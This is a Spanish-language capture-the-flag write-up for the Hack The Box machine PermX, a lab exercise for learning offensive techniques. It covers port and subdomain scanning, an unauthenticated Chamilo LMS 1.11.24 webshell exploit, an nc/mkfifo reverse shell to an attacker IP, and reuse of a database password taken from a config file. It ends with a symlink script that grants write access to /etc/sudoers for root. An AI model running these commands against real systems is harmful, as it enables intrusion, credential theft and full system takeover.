RECONOCIMIENTO — Escaneo de puertos

Lo primero es hacer un escaneo con nmap para ver a qué nos enfrentamos.

escaneo de puertos
nmap -p- -T5 10.129.51.254 -oG allPorts
PUERTO ESTADO SERVICIO
22/tcpOPENssh
80/tcpOPENhttp

Solo hay una web a simple vista. Al entrar, redirige al dominio permx.htb, que se añade al /etc/hosts.

// 02

ENUMERACIÓN — Subdominio con Chamilo LMS

Tras probar fuzzing de directorios sin resultado, se pasa a enumerar subdominios con ffuf.

fuzzing de subdominios (vhost)
ffuf -w subdomains.txt -u http://10.129.51.254 -H "Host: FUZZ.permx.htb" -fc 302
Subdominio encontrado
Aparece lms.permx.htb, que se añade al /etc/hosts. Al entrar se ve el portal de login de Chamilo, una plataforma LMS (Learning Management System).

La ruta /documentation/changelog.html revela la versión exacta instalada.

Chamilo LMS 1.11.24
Con la versión identificada se busca en searchsploit y aparece un exploit de Remote Code Execution (RCE) para esta versión concreta.
// 03

RCE — Chamilo 1.11.24 sin autenticación

Se descarga el exploit público y se prueba contra el LMS.

prueba del exploit
python 52083.py http://lms.permx.htb/ 'id'
[+] File uploaded successfully! [+] Access the shell at: http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/rce.php?cmd= [+] Command Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Ejecución de comandos confirmada
El exploit sube una webshell PHP sin necesidad de autenticación y permite ejecutar comandos como www-data.

Se usa el mismo exploit para lanzar una reverse shell, con el payload de nc + mkfifo urlencodeado.

payload de reverse shell (urlencoded)
python 52083.py http://lms.permx.htb/ 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Cbash%20-i%202%3E%261%7Cnc%2010.10.15.51%204444%20%3E%2Ftmp%2Ff'

Con un listener en el puerto 4444, llega la shell como www-data.

CREDENCIALES — Config de Chamilo reutilizada

Se revisa el fichero de configuración de la aplicación en busca de credenciales.

config.php
grep 'db_user\|db_password' /var/www/chamilo/app/config/configuration.php
$_configuration['db_user'] = 'chamilo'; $_configuration['db_password'] = '03F6lY3uXAP2bkW8';
Contraseña reutilizada por un usuario del sistema
El único usuario con carpeta propia en /home es mtz. Se prueba la contraseña de la base de datos por si la reutiliza, y funciona.
cambio de usuario

SYMLINK — Abuso de /opt/acl.sh

Se comprueban los privilegios sudo del usuario.

sudo -l
sudo -l
User mtz may run the following commands on permx: (ALL : ALL) NOPASSWD: /opt/acl.sh

Se puede ejecutar /opt/acl.sh como cualquier usuario sin contraseña. El script solo se puede leer y ejecutar, no modificar.

/opt/acl.sh
#!/bin/bash if [ "$#" -ne 3 ]; then /usr/bin/echo "Usage: $0 user perm file" exit 1 fi user="$1"; perm="$2"; target="$3" if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then /usr/bin/echo "Access denied." exit 1 fi if [ ! -f "$target" ]; then /usr/bin/echo "Target must be a file." exit 1 fi /usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
Validación de ruta insuficiente
El script concede permisos ACL sobre cualquier fichero que empiece por /home/mtz/ y no contenga .., pero no comprueba si esa ruta es un symlink hacia fuera de esa carpeta. Creando un enlace simbólico dentro de /home/mtz/ que apunte a /etc/sudoers, el script termina dándonos permisos de escritura sobre el propio /etc/sudoers.

Como la máquina revierte los cambios al poco tiempo, se automatizan todos los pasos en un único script.

exploit.sh
#!/bin/bash ln -sf /etc/sudoers /home/mtz/evil sudo /opt/acl.sh mtz rw /home/mtz/evil echo "mtz ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers sudo su

Se le dan permisos de ejecución y se lanza.

ejecución del exploit
chmod +x exploit.sh ./exploit.sh
root@permx:/home/mtz# whoami root
lectura de la flag
cat /root/root.txt
ROOT FLAG 00618370d658ed129600eb0abdd2746f
